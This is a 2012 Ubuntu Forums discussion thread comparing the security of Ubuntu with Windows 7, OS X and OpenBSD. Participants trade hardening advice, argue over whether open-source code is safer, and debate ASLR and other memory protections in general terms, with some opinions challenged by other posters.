---
title: "How secure is Ubuntu compared to other operating systems?"
date: 2012-02-11
forum: Recurring Discussions
---

### Post by Welly Wu on 2012-02-11
First of all, please forgive me for starting this thread. My lame excuse is that I slept all morning and afternoon yesterday and I have been wide awake tonight. It also helps that I drank a lot of coffee right now.

I did some searches, but I am looking for the community to answer some of my questions and to provide me with further opinions and more resources so that I can read more information about this subject matter.

Just how secure is the latest stable release version of Ubuntu 64 bit with a default installation and no configurations or modifications being made to the operating system, services, or software packages? How secure is Ubuntu 64 bit compared to other operating systems such as Microsoft Windows 7 64 bit or Apple OS X? How secure is Ubuntu 64 bit compared to other GNU/Linux distributions when comparing default installations exclusively?

More interestingly, how secure is a hardened version of Ubuntu 64 bit? Say an Ubuntu user were to follow the wikis and stickies carefully by implementing NIDS (Snort and BASE), HIDS, UFW to deny incoming and outgoing traffic with only a few key ports for essentials such as HTTP and HTTPS, POP3S, IMAP, etc? This also includes creating custom AppArmor profiles for services and software packages such as web browsers, e-mail clients, services such as FTP, WINE if the Ubuntu user were to install it, etc? This also includes setting up VPN to connect to the Internet when traveling outside of your home or business to mobile Wi-Fi Hot Spots or connecting to your company's VPN.

The reason why I want to answers to these questions is because I am curious. I rarely see threads or replies here in Ubuntu Forums about an Ubuntu user getting hacked. I never saw a thread about an Ubuntu server get hacked.

I chose Ubuntu 11.10 64 bit because Canonical does a great job at providing the device drivers for my hardware right out of the box. I also chose Ubuntu because it is considered to be the friendliest GNU/Linux distribution for new Ubuntu users like myself. Ubuntu has almost all of the essential software packages for me to live my life without having to use a Microsoft Windows computer anymore. It has saved me a tremendous amount of time and money. I chose Ubuntu because it has a well earned reputation for its layered security architecture and defense in depth. I feel safe and secure using Ubuntu 64 bit compared to when I used Microsoft Windows 7 Ultimate 64 bit because I can see exactly what my computer is doing at any time and I am in full control of all its process, resources, and network connections.

I performed a security audit on my Verizon FiOS home network and my ASUS N61JV-X2 notebook PC running Ubuntu 11.10 64 bit. Basically, no unauthorized person is trying to hack my system. I am a relatively low profile target in this world. I don't abuse my social media outlets to spew out inflammatory remarks that would attract attention to myself for the most part.

Most of my family members and friends come to me when they have computer problems or if they need help to secure their systems and data. I am not the foremost expert in these matters, but I am able to solve their problems most of the time. I am starting to think about recommending that they try Ubuntu 64 bit as their primary operating system, but this is very difficult because they are very familiar with Microsoft Windows and its ecosystem. They can not fathom using Linux because they think it is for computer nerds and geeks which they label me as if I had earned that moniker. I have not earned the right to call myself a geek or nerd at all. I use Ubuntu because I literally ran out of money to pay for specialized software applications necessary to make Microsoft Windows 7 Ultimate 64 bit function properly. I also got tired of the unstable and unreliable nature of Microsoft Windows and its poor security that requires its users to pay for hardware and software from third party companies just to maintain a reasonable amount of safety and security to use it on a daily basis.

What else am I missing? What questions should I rather be asking of this community on this subject matter? What required reading sources should I invest my time and mind in beyond the Ubuntu Basic Security Wiki and the stickies here in the security forum to enhance my capabilities to harden Ubuntu?

Finally, I do not pretend to know enough to declare that my Ubuntu 11.10 64 bit operating system is 100 percent safe and secure from all threats and threat vectors. That is just impossible. However, I do think that I can stand to learn more about hardening it a bit further and my next goal is to learn about AppArmor and to create some custom AppArmor profiles for Google Chrome, Mozilla Firefox and Thunderbird, and Skype because these are the most frequently used software applications that require access to the Internet on my computer. I am holding off on working on NIDS including Snort and BASE because I received a few private messages from a fellow Ubuntu user who sourced some information that BASE is vulnerable to a SQL injection attack and to wait for a patch from the developers before I deploy this system on my computer. After that, my next goal is to read the HIDS sticky and to follow its recommendations.

I think that I made a good decision to choose Ubuntu 64 bit. I thought about installing OpenBSD 5.x, but I lack the experience and technical skills necessary to install it, set up a graphical user interface such as GNOME, and further harden it. I have no previous experience with OpenBSD whatsoever.

How secure is Ubuntu 11.10 64 bit compared to OpenBSD 5.x? What are the similarities and what are the differences out of curiosity?

Thank you. I will be monitoring this thread carefully. I hope to read a plethora of informative replies and opinions as well as answers to some of my questions. I especially look forward to learning about better questions that I should be asking of this community so that I can derive more value from this thread. I hope that it will be helpful and useful for other members as well.

Today marks my fourth consecutive week using Ubuntu 64 bit. I know that I saved myself at least $39.99 USD by switching from Microsoft Windows 7 Ultimate 64 bit to Ubuntu 11.10 64 bit because I did not have to purchase DriverMax software to install the proper device drivers for Microsoft Windows 7 on my ASUS N61JV-X2 notebook PC. I consider myself a new Ubuntu user with an open and curious mind.

Peace be with you.

---

### Post by mebunto on 2012-02-11
Ultimately all systems are secure as you make them.  If you want to be really secure then you need someone to "penetration test" or "health check".  Simple things like passwords left either blank or at their default can open up a system to the world.  Also routers, UPSs and other devices can be vulnerable to attack and can also open up a path into your system.  Some off the shelf software has inherent vulnerabilities which are only discovered after they've been hacked.
I've worked for years with very professional people, who think they've covered everything, but the pen. test always finds "the obvious".
Go to cesg.gov.uk for CAPS approved products or to the US equivalent FIPS fips201ep.cio.gov/apl.php

---

### Post by amauk on 2012-02-11
This gives a nice high-level overview of the security features present
[https://wiki.ubuntu.com/Security/Features](https://wiki.ubuntu.com/Security/Features)

---

### Post by tubbygweilo on 2012-02-11
amauk,
many thanks, a most useful link and information.

---

### Post by winh8r on 2012-02-11
In response to the OP, 

As you are already aware of the stickies on this forum then you have already found your link to some of the most comprehensive security how-to's and information available for Ubuntu.

The trick is read everything you can find, then read it again and configure your own system for whatever your needs are.

The main ingredient in a secure system running any OS, is a user who thinks about what they are doing or allowing BEFORE they do it.

The only way to make any system 100% unhackable/uncrackable is to unplug it and bury it it a remote location encased in concrete, even then it is still vulnerable when someone digs it up!!!

---

### Post by goodbye-windows(tm) on 2012-02-11
I am no security expert, and I've only been running linux for about 6 months. But, I've been around awhile and make it my business to have a relatively secure system.

Here's my take on some of the security issues that linux solves or greatly improves.

Operating system is open sourced......when a vulnerability is discovered, it is well documented and fixed as there are many who know programming. The number of back door security holes is greatly reduced. An open sourced os isn't proprietary and there is no hidden/undesirable 'features' that are cloaked/secret and unknown.

Software is open sourced........with few exceptions, software for ubuntu is open sourced. Thus, you can be pretty well assured that there are no built in malware issues that fundamentally defeat the users ability to have a secure system.

Software sources.......the ubuntu community maintains a software center, so the users can feel safe downloading software that is previously evaluated for back doors and built in security risks.

Encryption......unlike other operating systems, it is practical to encrypt your hard drive data. While other os's can be encrypted, they have so many back doors and security issues that encryption on them is a waste of time.

Your operating system is the heart of security, if it's not secure, there is no way to make the data you store secure. Basically, the os must be secure and open sourced so that security issues can be discovered, publicized and and resolved (not just cosmetically patched::>).

I sleep much more soundly knowing my computer is mine...and not an open book to the whole world.

Linux needs a secure browser to combat privacy issues that track your computer everywhere it goes on the net. Other than that, I'm not sure there is a better secured os than ubuntu.

Enjoy.

Art

---

### Post by Welly Wu on 2012-02-11
I took a graduate course in Wireless Security at New Jersey Institute of Technology. My professor worked at the National Security Agency for a number of years prior to teaching at NJIT. He said that open source software is inherently risky because everybody has access to the source code. Anyone can modify the source code to insert malware and most users will not notice any differences when they download updates and patches. By that time, it will be too late and they will be compromised. He said that closed source systems are not that much better, but they do not suffer from this problem faced by open source software. He also said that Microsoft Windows 7 Professional, Enterprise, and Ultimate 64 bit are more secure than Apple Macintosh OS X and most GNU/Linux distributions except for Red Hat Enterprise Linux and Novell SUSE Linux Enterprise Desktop which meet EAL 4+ certification.

Is he right?

My point is that Canonical has a team of Ubuntu developers and they are responsible for code audits for security issues. They would not release a patch or update with known bugs or security vulnerabilities. This ensures the security and quality of every Ubuntu distribution release. This is why Ubuntu keeps improving every six months with every new release in April and October every year.

I read all of the wikis and stickies that were recommended to me to read. I have a good understanding about Ubuntu security models and systems. I am slowly working on hardening my Ubuntu 11.10 64 bit installation every day. My thoughts and feelings on this subject matter are such that a hardened Ubuntu is extremely difficult to hack from a remote location. Gaining physical access to my computer by an unauthorized person would be much more devastating to my computer security which is why I leave it at home almost all of the time in my bedroom.

I would like to see some replies from some experienced Ubuntu users that have contributed to the security stickies in the past to chime in on my thread. I really want to read the point of view of someone who uses OpenBSD and Ubuntu to compare the similarities and differences.

---

### Post by amauk on 2012-02-11
> **Welly Wu said:**
> Is he right?No, he's misinformed

> **Welly Wu said:**
> He said that open source software is inherently risky because everybody has access to the source code.
....
Anyone can modify the source code to insert malwareA piece of software is a piece of software
Open or closed source, it's still the same code
If a program is intentionally nasty or has a vulnerability, it'll still be nasty or vulnerable whether the code that generates the program is open or closed

Sure, with open-source you can download the source code to some program, and alter the code to insert malware
But then you (and only you) have the altered program
How exactly are other people going to be affected by a program only you have?

You'll need to find a way of distributing your changes to other people, which will be nigh on impossible

---

### Post by needhelppeeps on 2012-02-12
The primary difference I see between giving someone Windows 7 and Ubuntu are that Windows 7 treats the first user who signs in as an administrator and the fact that the OS is so heavily targeted by Malware Authors. No doubt Windows has gotten better but it's very nature still encourages local admin use and the need to download lots of third party apps that would be difficult to keep updated for most home users. 

Ubuntu on the other hand makes it more of a pain to do something as admin (not just cllick a button but bother to enter a password too) and provides patch and update management for most software a user should need.

In a corporate environment with patch management services, removal of local admin rights, and software vetting, disk encryption on laptops, etc, I think Windows 7 can be fairly secure, though. Since most home users are poorly prepared to handle these tasks themselves, Ubuntu is a much better choice since it's doing a lot of the hard work for them.

---

### Post by Welly Wu on 2012-02-12
I think that Ubuntu is more secure than Microsoft Windows 7 Ultimate or Enterprise 64 bit and certainly more secure than Apple OS X Lion. All of the critical aspects of good security design are incorporated into Ubuntu without compromising usability too much. Even with ISV certified software applications, there are numerous bugs and security vulnerabilities associated with them such as Adobe Creative Master Suite 5.5, AutoCAD, Microsoft Office, Sun Java, Adobe Flash, etc. There is just too much software that does not undergo the most stringent quality assurance. Then, there is the plethora of software applications that are available to Microsoft Windows users that can cause incompatibility problems and lead to Windows rot or corruption. 90 percent of Microsoft Windows users choose to use an account with Administrator privileges. This is equivalent to logging into Ubuntu as root user. This is why they have so many security vulnerabilities from malware and they get hacked so easily. Technically, Microsoft Windows 7 meets Evaluation Assurance Level 4+. Yet, it gets slower over time and it degrades in terms of stability and reliability within as little as 6 months of heavy usage. Microsoft Windows customers constantly have to re-install and re-verify their product keys and activation codes and registration information for all of the expensive software applications that they purchased. This is another security nightmare: keeping track of all of that information so that you can re-install the software and the operating system every 6 months to maintain a fresh installation.

I think that Microsoft Windows 7 Ultimate and Enterprise 64 bit is fairly secure, but it is not nearly as secure as Ubuntu 11.10 64 bit. I consider myself to be a Windows expert and a new Ubuntu user. As you can tell by some of the threads that I have created within this community, I am particularly interested in computer security. My basic understanding about Ubuntu security is that it is an entirely different architecture compared to Microsoft Windows and it is much more secure by default than Windows or Apple OS X Lion. Hardening Ubuntu almost makes it next to impossible for a hacker to hack into your Ubuntu system from a remote location. The biggest security threat vector would be if an unauthorized person or team of people were to gain physical access to your computers regardless of which operating system or software applications that you use on each machine. This is especially true for people that use notebook PCs or laptops. This is also true for people that own tablets and smart phones especially if you are running Google Android, Honeycomb, or Ice Cream Sandwich.

Quite frankly, the more that I learn a little bit about Ubuntu's security architecture, models, layers, and defense in depth, I feel that I made the correct decision to switch to using Ubuntu 11.10 64 bit. I plan to keep upgrading to a new Ubuntu release every 6 months in April and October each year because the security keeps getting better and it improves over time with each new release on the whole.

I am going to keep reading the stickies and I will begin work on AppArmor and creating my custom AppArmor profiles next week. I want to find the right balance in capabilities for each AppArmor profile that I create for software packages that need network access especially to the Internet or World Wide Web. This will take me some time to learn how to master because it is both an art and a science. I have to determine my tolerance for risk and do a thorough analysis for each AppArmor profile that I create.

After that, I will read the HIDS sticky and work on following the recommendations. It should take me about two weeks to learn how to read all of the log files to understand what it is telling me about my Ubuntu system.

It is getting easier for me to understand the Ubuntu mindset toward security. I am feeling more confident about my progress every day with the little extra knowledge that I gain by reading volumes of wikis and stickies and manuals. I am sure that I will be able to harden my Ubuntu system almost completely by the end of this month. That will be cause for joy and celebration albeit tempered by caution and staying vigil.

Based upon my cursory research, OpenBSD 5.x is one of the most secure operating systems in the world. It is far superior in terms of security than Ubuntu can ever be, but the price to pay is that it sacrifices usability and friendliness to new users. OpenBSD requires higher technical skills to understand how to install it and use it on a daily basis compared to Ubuntu. I think that I will download the latest stable installation files and I will create a Virtualbox virtual machine so that I can play around with it.

---

### Post by Dangertux on 2012-02-12
> **Welly Wu said:**
> I took a graduate course in Wireless Security at New Jersey Institute of Technology. My professor worked at the National Security Agency for a number of years prior to teaching at NJIT. He said that open source software is inherently risky because everybody has access to the source code. Anyone can modify the source code to insert malware and most users will not notice any differences when they download updates and patches. By that time, it will be too late and they will be compromised. He said that closed source systems are not that much better, but they do not suffer from this problem faced by open source software. He also said that Microsoft Windows 7 Professional, Enterprise, and Ultimate 64 bit are more secure than Apple Macintosh OS X and most GNU/Linux distributions except for Red Hat Enterprise Linux and Novell SUSE Linux Enterprise Desktop which meet EAL 4+ certification.

Is he right?

My point is that Canonical has a team of Ubuntu developers and they are responsible for code audits for security issues. They would not release a patch or update with known bugs or security vulnerabilities. This ensures the security and quality of every Ubuntu distribution release. This is why Ubuntu keeps improving every six months with every new release in April and October every year.

I read all of the wikis and stickies that were recommended to me to read. I have a good understanding about Ubuntu security models and systems. I am slowly working on hardening my Ubuntu 11.10 64 bit installation every day. My thoughts and feelings on this subject matter are such that a hardened Ubuntu is extremely difficult to hack from a remote location. Gaining physical access to my computer by an unauthorized person would be much more devastating to my computer security which is why I leave it at home almost all of the time in my bedroom.

I would like to see some replies from some experienced Ubuntu users that have contributed to the security stickies in the past to chime in on my thread. I really want to read the point of view of someone who uses OpenBSD and Ubuntu to compare the similarities and differences.

I disagree with the proprietary versus open source argument. Though it is easier to see a vulnerability in uncompiled code, it is no less difficult to exploit Open Source or proprietary software (the process is the same).

Another thing, Ubuntu 10.04 LTS also eared an EAL rating of 4+ like RHEL and SuSe. The development releases are not rated as far as I know.

---

### Post by jerrrys on 2012-02-12
[http://www.linuxsecurity.com/](http://www.linuxsecurity.com/)

[http://freecode.com/articles](http://freecode.com/articles)

[http://ubuntuforums.org/showthread.php?t=510812](http://ubuntuforums.org/showthread.php?t=510812)

---

### Post by mebunto on 2012-02-12
Do go to [http://ubuntuforums.org/showthread.php?t=510812](http://ubuntuforums.org/showthread.php?t=510812) I only just found it and there's plenty of help to make your system secure.
Like I said at the beginning - and it doesn't matter if it's open source or proprietary - if you don't lock your system down and have an independent check, you'll never know that it's secure.

---

### Post by spynappels on 2012-02-13
> **Welly Wu said:**
>  I plan to keep upgrading to a new Ubuntu release every 6 months in April and October each year because the security keeps getting better and it improves over time with each new release on the whole.


This is not necessarily the case, as long as you keep up with security patches at any stage within the lifetime of the support (18 months for normal Desktop releases, 3 years for LTS releases of Desktop Edition). Upgrading to each new is not going to necessarily make you any safer unless the version you are upgrading from is End-of-Life.

---

### Post by goodbye-windows(tm) on 2012-02-13
> **Welly Wu said:**
> I took a graduate course in Wireless Security at New Jersey Institute of Technology. My professor worked at the National Security Agency for a number of years prior to teaching at NJIT. He said that open source software is inherently risky because everybody has access to the source code. Anyone can modify the source code to insert malware and most users will not notice any differences when they download updates and patches. By that time, it will be too late and they will be compromised. He said that closed source systems are not that much better, but they do not suffer from this problem faced by open source software. He also said that Microsoft Windows 7 Professional, Enterprise, and Ultimate 64 bit are more secure than Apple Macintosh OS X and most GNU/Linux distributions except for Red Hat Enterprise Linux and Novell SUSE Linux Enterprise Desktop which meet EAL 4+ certification.

Is he right?

Spoken like a true Big Brother::>
[B]
No, he's out to lunch.[/B] Software that is not open sourced can contain anything-who knows what's really in the software??

With open source, the user can download the source code and make sure it has no security issues such as malware, keyboard loggers, etc. Then, they compile it. 

The majority of the users are not technical and don't know programming. But, with open sourced software, the users peers who are software savvy can examine the source code and make sure it's safe.

As long as the compiled version is available from a reliable website/source, then we have a pretty high confidence that the compiled version of the software is safe. In ubuntu, the software center provides safe compiled versions of software. An ubuntu user who downloads software from unknown sources is a fool (IMHO).

Open source = yes/ok.....non open sourced software might be ok, but shouldn't be used unless there is no other way.

GL to all.

Art

---

### Post by tubbygweilo on 2012-02-14
> **spynappels said:**
> This is not necessarily the case, as long as you keep up with security patches at any stage within the lifetime of the support (18 months for normal Desktop releases, 3 years for LTS releases of Desktop Edition). Upgrading to each new is not going to necessarily make you any safer unless the version you are upgrading from is End-of-Life.

I agree with this mode of working as once the new LTS has settled down (Three months) then install and pick from repos and from then on accept only security updates. This has the minimum of change to what to you is now a stable environment and should be so until the next LTS.

---

### Post by hildenbrandsteven on 2012-02-14
Nothing is *unhackable.* However, you're claiming that you are a low-risk user meaning you probably don't have any reason to be targeted. Linux in general offers you the security of not being at-risk to large-scale Windows targeted worms/viruses.. It also offers the benefit of being open-source, meaning nothing may be running or used on your system that you're unaware of. Therefore, if you're up-to-date and a normal user.. there is virtually no chance of you being *hacked.*

---

### Post by haqking on 2012-02-14
> **Welly Wu said:**
> I took a graduate course in Wireless Security at New Jersey Institute of Technology. **My professor worked at the National Security Agency for a number of years prior to teaching at NJIT**. .


I expect he meant he was in the NRA. ;-)

Most ex this and that usually werent, if they were they dont go telling everyone (for the most part)

If he was then it means nothing, he may have been a Janitor there, every organisation needs cleaning

---

### Post by mmsmc on 2012-02-16
nothing is unhackable, this is true, but if it is privacy and security you want then you have a couple of options. Personally I use win 7 for gen browsing, weaknet for pen testing, and I like to keep my secure files in usb pup nix*(mind you that when booting up pup you still leave a trace, but no sec info do to the fact that it runs on ram, atleast that is my understanding please correct me if i am wrong), and then there is tails, which i like for its privacy

---

### Post by ztux on 2012-02-16
I've found Ubuntu's security to be very good. The firewall is excellent and by default has no open ports. Updates come in a timely fashion and you can quickly patch a complete system. Privilege separation and escalation work very well. Additional security can be installed quite easily and is sanely configured. Being able to easily set up a completely or partially encrypted is a huge plus.

That being said, Ubuntu has some weak points. The recovery mode entry on he boot menu gives root access with no password. Recent releases offer easy access to disk or home encryption, so this is mitigated. AppArmor does not cover much of the system, the degree of security it offers is misleading. By default, more services are running than you probably need.

---

### Post by aysiu on 2012-02-16
> **ztux said:**
> 
That being said, Ubuntu has some weak points. The recovery mode entry on he boot menu gives root access with no password. Physical access is root access. True of any operating system, unless it's encrypted.

---

### Post by Abir Valg on 2012-02-16
To the OP:
As far as I'm concerned, the ASLR + PIE mechanism is best implemented on Linux.
Windows XP - ASLR doesnt exist
Windows Vista - ASLR can be bypassed
Windows 7 - ASLR can be bypassed
MacOs - ASLR poorly implemented and can be bypassed
If you couple NX-bit, ASLR and PIE executables (which Ubuntu does for some executables) with a 64-bit machine, you get a real stronghold.
For example write now I'm using PIE-enabled Firefox, and even if there  are 0-day buffer overflow vulnerabilities in my browser, the attacker  won't be able to exploit them. I'm feeling pretty secure in this regard.

---

### Post by Dangertux on 2012-02-16
> **Abir Valg said:**
> To the OP:
As far as I'm concerned, the ASLR + PIE mechanism is best implemented on Linux.
Windows XP - ASLR doesnt exist
Windows Vista - ASLR can be bypassed
Windows 7 - ASLR can be bypassed
MacOs - ASLR poorly implemented and can be bypassed
If you couple NX-bit, ASLR and PIE executables (which Ubuntu does for some executables) with a 64-bit machine, you get a real stronghold.
For example write now I'm using PIE-enabled Firefox, and even if there  are 0-day buffer overflow vulnerabilities in my browser, the attacker  won't be able to exploit them. I'm feeling pretty secure in this regard.

While memory protection is well implemented in Linux/Ubuntu it is bypassed no differently in Linux than windows.

All of the methods you mentioned can be bypassed either via heap spraying (heap corruption in general) or return oriented programming (ret2libc or ret2plt), the same way they can be bypassed under Windows.

Also in terms of memory protection you forgot to mention the stack canary which is the hardest to bypass, and in some vulnerabilities can be bruteforced if the exploit is repeatable. (IE : doesn't just cause a crash.)

If you really want protection from the dreaded 0 day, you should invest time in learning to configure mandatory access controls like Apparmor or SELinux (for those Windows folks look at Group Policies and Applocker , there are also third party solutions).

Also 64 bits only gives you about 48 bits of total entropy, not the full 64.

Hope this helps.

---

### Post by Abir Valg on 2012-02-17
@Dangertux, thank you for bringing up valid points.

> All of the methods you mentioned can be bypassed either via heap  spraying (heap corruption in general) or return oriented programming  (ret2libc or ret2plt), the same way they can be bypassed under Windows.
Heap spraying requires the heap to be executable, right? The NX-bit makes heap non-executable.
ret2libc or ret2plt require a guess of the address. If you have full ASLR (with PIE) the chances even on 32-bit is around 1/4096.

The way ASLR is bypassed on Windows is:
Vista - doesn't have all libs ASLR-enables
7 - has certain static memory areas with the same address across reboots (now that's silly)
MacOs - supports ASLR in libs but not in executables (non-PIE)

I must admit that JIT-spraying is the only effective type of heap spraying. So I disabled Javascript + Flash until Firefox devs find a way to safeguard against that.

> Also in terms of memory protection you forgot to mention the stack  canary which is the hardest to bypass, and in some vulnerabilities can  be bruteforced if the exploit is repeatable. (IE : doesn't just cause a  crash.)
Yes, I forgot to mention the canary, which adds another layer on top of everything mentioned.

---

### Post by Dangertux on 2012-02-17
> **Abir Valg said:**
> @Dangertux, thank you for bringing up valid points.

Heap spraying requires the heap to be executable, right? The NX-bit makes heap non-executable.
ret2libc or ret2plt require a guess of the address. If you have full ASLR (with PIE) the chances even on 32-bit is around 1/4096.

The way ASLR is bypassed on Windows is:
Vista - doesn't have all libs ASLR-enables
7 - has certain static memory areas with the same address across reboots (now that's silly)
MacOs - supports ASLR in libs but not in executables (non-PIE)

I must admit that JIT-spraying is the only effective type of heap spraying. So I disabled Javascript + Flash until Firefox devs find a way to safeguard against that.

Yes, I forgot to mention the canary, which adds another layer on top of everything mentioned.

The concept with ret2plt is that the plt is statically linked, so... You shouldn't be doing too much guessing.

The other things you said are correct though.

---

### Post by Dangertux on 2012-02-17
Sorry for the double post but a nifty fact about return to plt (procedure linkage table). This is a common technique used for bypassing Address Space Layout Randomization and as I said in my previous post you could use it to grab up your payload from in PLT. That being said on newer kernel versions (3.0) it appears that even these addresses are randomized (I'm not sure if this is backported to 10.04 LTS or not). So those do offer that extra protection, older 2.6 series kernels however do not offer this protection and can still be exploited in this manner.

So there is some incentive for the sec concscious folks on this forum to upgrade to a 3 series kernel

---

### Post by Welly Wu on 2012-02-17
This is why I keep upgrading to the latest stable release version of Ubuntu 64 bit. The security just keeps getting better and improvements are made with each release on the whole. That's my opinion and observation.

---

### Post by haqking on 2012-02-17
> **Welly Wu said:**
> This is why I keep upgrading to the latest stable release version of Ubuntu 64 bit. The security just keeps getting better and improvements are made with each release on the whole. That's my opinion and observation.

as long as you remember that security is a process not a product or state.

Security onus is on the admin/user and their practice outside of the security built in to the product they choose to use, product security is a balance between ease of use and functionality, the process of security is up to you.

Peace

---

### Post by ztux on 2012-02-18
> **aysiu said:**
> Physical access is root access. True of any operating system, unless it's encrypted.

I see no reason it should be this easy.

---

### Post by OpSecShellshock on 2012-02-18
> **ztux said:**
> I see no reason it should be this easy.

It's not really a question of easy or difficult. Characteristics that are required for devices to even function in the first place also enable them to be used with administrative access by anyone who knows how. What they won't be able to do is access data that is encrypted, provided the passphrase is sufficiently strong and the key is no longer present in the physical memory. In that sense the benefits to legitimate users of recovery mode root access exceed the risks, since clear data can be accessed with or without it, and encrypted data if implemented correctly cannot be accessed with or without it (by unauthorized parties).

That's just in general, of course. Usage context matters. Things may be different in the case of business or sensitive use.

---

### Post by 0011235813 on 2012-02-18
@The OP

You ask whether Ubuntu 11.10 64-bit is secure by default? From what I've seen, it is quite secure. In fact, I'd say that a default Ubuntu installation is about 10x (It **is** hyperbole, I'm not sure exactly how much) more secure by default to the average user than Windows 7 (and certainly older versions) . With the Mac, Apple mainly relies on it's obscurity for it's security, but from what I've heard, Apple has some very poor patching for its OS, and it's default programs like Safari give a lot of information away. Furthermore, it lacks many useful security tools like encryption- Windows at least, has some third party programs capable of doing it. However, it does have root& user features (It's a UNIX copy after all), and Apple is trying to Sandbox it (but not without destroying the usability of some useful programs of course) . Mac also has an "Appstore" though I wouldn't say it's as good as the repos.

Now, for the advanced user, it's a slightly different matter. Of course, they can encrypt their drives, use more advanced firewall programs, employ "apparmor like" features, block sites, configure browsers and email clients etc.

However, the fact remains that Windows& OSX are still fundamentally insecure operating systems. Here's why:

- As already mentioned, Linux is open-source, thus meaning a lot more people are viewing source code and making updates& patches.

- Default programs. Internet Explorer has poor security (especially that ActiveX nonsense almost nobody uses) and lacks many add-ons to improve security. And of course, it's closed source and hardly anyone ever patches it. Same goes for Safari.

- Users. Because Linux makes the user an "administrator" but not *root*, malware can't destroy system files.

- Education. Most Linux users visit the forums. And since the entire community is telling them how to harden their system and what not to do, it dramatically improves user awareness, one of the most important factors in PC (And Mac) security. Microsoft doesn't bundle any big guide called "read me before you do anything" into its OS.

-Advanced features. This includes apparmor (or SELinux) and a real firewall program (ufw, gufw, iptables whatever you fancy) .

As for OpenBSD, it seems to me that it **is** the most secure OS on the planet, but really, it's probably better suited for the paranoid and those who own Bank sites or government facilities.

---

### Post by Porcini M. on 2012-02-18
> **0011235813 said:**
> 
-Advanced features. This includes apparmor (or SELinux) and a real firewall program (ufw, gufw, iptables whatever you fancy) .


Win7 does have a real firewall feature - it does catch at least outgoing stuff pretty diligently (I've tinkered around with it).

---

### Post by 0011235813 on 2012-02-18
> **Porcini M. said:**
> Win7 does have a real firewall feature - it does catch at least outgoing stuff pretty diligently (I've tinkered around with it).

But by default it's rather weak and it doesn't tell the user anything about what it does and how they're supposed to use it.

---

### Post by Porcini M. on 2012-02-18
> **0011235813 said:**
> But by default it's rather weak and it doesn't tell the user anything about what it does and how they're supposed to use it.

Fair enough, but when you make the effort to find it in the settings (and get past the generic weak/medium/strong meta-modes), it does allow you to make detailed rules on a by-port and by-application basis.

---

### Post by Welly Wu on 2012-02-18
I am now certain that I made the right choice by switching from Microsoft Windows 7 Ultimate 64 bit to Ubuntu 11.10 64 bit. I won't say that my computer is invincible, but I am in the process of hardening it this month. I have a lot of reading and thinking to do with the wikis, stickies, and official Ubuntu Help web pages.

Should I stick with AppArmor or should I switch to NSA SELinux? AppArmor is easier to configure for individual software applications, but NSA SELinux implements multi-level security and it encompasses more of the user land and the Linux kernel. I prefer NSA SELinux because I actually do trust the NSA and the US Department of Defense. What should I do?

---

### Post by 0011235813 on 2012-02-18
> **Welly Wu said:**
> I am now certain that I made the right choice by switching from Microsoft Windows 7 Ultimate 64 bit to Ubuntu 11.10 64 bit. I won't say that my computer is invincible, but I am in the process of hardening it this month. I have a lot of reading and thinking to do with the wikis, stickies, and official Ubuntu Help web pages.

Should I stick with AppArmor or should I switch to NSA SELinux? AppArmor is easier to configure for individual software applications, but NSA SELinux implements multi-level security and it encompasses more of the user land and the Linux kernel. I prefer NSA SELinux because I actually do trust the NSA and the US Department of Defense. What should I do?

I'd stick to apparmor, I highly doubt any hacker would be able to get into your OS. So a little extra security isn't worth all the time and effort. Besides, unless you happen to have a computer with infinite resources to support and infinite OS, you're never going to have it unhackable.

---

### Post by Porcini M. on 2012-02-18
I agree with the above - apparmor gives you a good extra layer of security with relatively little effort or expertise.

---

### Post by Dangertux on 2012-02-18
Wow I dont even know where to begin on some of these things. So I will hit a few high points here.

- sudo doesnt protect you any more than UAC does under Windows, so please stop with the admin account argument it hasnt been valid in 7 years.

- Macs do in fact support full drive encryption, so does Windows so stop being sensationalist

- windows firewall is configured equally with Ubuntu's iptables configuration by default. Neither block anything by default.

- windows supports mandatory access controls (like apparmor) through applocker and group policies

- Mac is a UNIX clone??? Mac uses the mach micro kernel and has bsd userland tools the same as your revered openbsd.

- openbsd is the most secure??? Based on what? Let me guess BSD jails abd w^ x. Guess what container based virt is around in most OSes and they all support some type of noexec

I think a lot of what was said in the last few posts are entirely opinion.

---

### Post by 0011235813 on 2012-02-19
> **Dangertux said:**
> Wow I dont even know where to begin on some of these things. So I will hit a few high points here.

- sudo doesnt protect you any more than UAC does under Windows, so please stop with the admin account argument it hasnt been valid in 7 years.

- Macs do in fact support full drive encryption, so does Windows so stop being sensationalist

- windows firewall is configured equally with Ubuntu's iptables configuration by default. Neither block anything by default.

- windows supports mandatory access controls (like apparmor) through applocker and group policies

- Mac is a UNIX clone??? Mac uses the mach micro kernel and has bsd userland tools the same as your revered openbsd.

- openbsd is the most secure??? Based on what? Let me guess BSD jails abd w^ x. Guess what container based virt is around in most OSes and they all support some type of noexec

I think a lot of what was said in the last few posts are entirely opinion.
Pressing yes or no can be done by a bot. But a bot can't make up a password.

Yes of course, but through third party applications, not by default. 

The difference is that Ubuntu automatically blocks incoming connections  by default. That's with no firewall. If someone were to turn of Windows firewall, that's it. They'd be vulnerable as a newborn baby.

Again, third party applications. An OS that relies on third party apps is always a poor security model.

Yes, both OpenBSD and OSX are UNIX copies. Windows is a DOS copy. The only mildly original OS I've seen is Chrome OS. And no, I don't "revere" BSD, that's the opinion of another person :popcorn:

Because the BSD programmers are constantly trying to remove theoretical flaws in their OS. That's all they ever do, since BSD is such a minority OS with so little money, they don't have the resources to do anything else.

Hope I've cleared up the confusions.

---

### Post by Dangertux on 2012-02-19
Passwords are generated all the time by computer programs... Ever heard of a bruteforce attack?

No...by default in the latest version of Lion and windows 7 always has

Ubuntu doesnt block anything, there are no services to connect to. Windows also no longer exposes services the way it used to either.

How are applocker and gpos third party apps they are as much a part of windows as apparmor is Ubuntu. Btw apparmor is actually a novell product so I guess its third party too

UNIX is not Linux or bsd. Just as  and  NT is not dos. So im not sure why you keep saying they are copies and I dont pretend to know what the bsd developers do with the re time

Hope this helps

---

### Post by kevdog on 2012-02-19
Sounds like this thread needs to be move to cafe. Getting pretty heated in here.

---

### Post by CharlesA on 2012-02-19
> **kevdog said:**
> Sounds like this thread needs to be move to cafe. Getting pretty heated in here.
It's still a discussion on security even if some of it is FUD.

Thanks DT for clearing some of that up. I always hate when the whole "Linux is more secure than Windows" argument comes up.

---

### Post by 0011235813 on 2012-02-19
> **Dangertux said:**
> Passwords are generated all the time by computer programs... Ever heard of a bruteforce attack?

No...by default in the latest version of Lion and windows 7 always has

Ubuntu doesnt block anything, there are no services to connect to. Windows also no longer exposes services the way it used to either.

